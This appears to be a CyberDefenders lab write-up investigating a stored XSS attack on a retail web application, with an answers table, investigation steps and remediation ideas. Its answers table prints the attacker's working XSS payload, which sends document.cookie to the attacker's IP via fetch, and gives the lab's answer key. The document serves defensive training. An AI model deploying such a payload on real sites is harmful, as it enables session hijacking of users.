# Retailbreach — Cross-Site Scripting (XSS) Session Theft — CyberDefenders

**Category:** Web Application Attack

## Scenario
Investigate a retail web application compromise involving a stored XSS attack that led to session token theft.

## Answers
| Question | Answer |
|---|---|
| Reconnaissance source IP | 111.224.180.128 |
| Reconnaissance tool used | gobuster |
| XSS payload used | `<script>fetch('http://111.224.180.128/' + document.cookie);</script>` |
| UTC timestamp of admin's first exposure to the injected script | 2024-03-29 12:09 |
| Stolen session token | lqkctf24s9h9lg67teu8uevn3q |

## Investigation
- Identified the attacker's reconnaissance activity first: source IP 111.224.180.128 running directory/path enumeration against the application, identifiable by the tool's characteristic request pattern (gobuster).
- Located the exact stored XSS payload — a script that exfiltrates the victim's cookies to the attacker's own server via a fetch request.
- Found the timestamp of the admin user's first page visit that contained the injected script, establishing when exposure actually occurred.
- Identified the stolen session token value from the exfiltrated traffic, which the attacker then reused for unauthorized access.

## What I'd do as an analyst
- Invalidate the stolen session token immediately and force re-authentication for the affected admin account.
- Identify and patch the vulnerable input/script that allowed the stored XSS to persist.
- Block the attacker's IP (111.224.180.128) at the firewall.
- Review the application for other unsanitized inputs vulnerable to the same class of attack.
- Check logs for any actions taken using the stolen session token between theft and invalidation.

## Notes / things I learned
- gobuster's request pattern (rapid, repeated requests probing many paths) is a recognizable reconnaissance signature, similar in concept to Nmap's scanning pattern from other labs.
- Stored XSS is more dangerous than reflected XSS specifically because it doesn't require tricking a specific victim into clicking a crafted link — any user (including an admin) who simply visits the affected page is exposed.
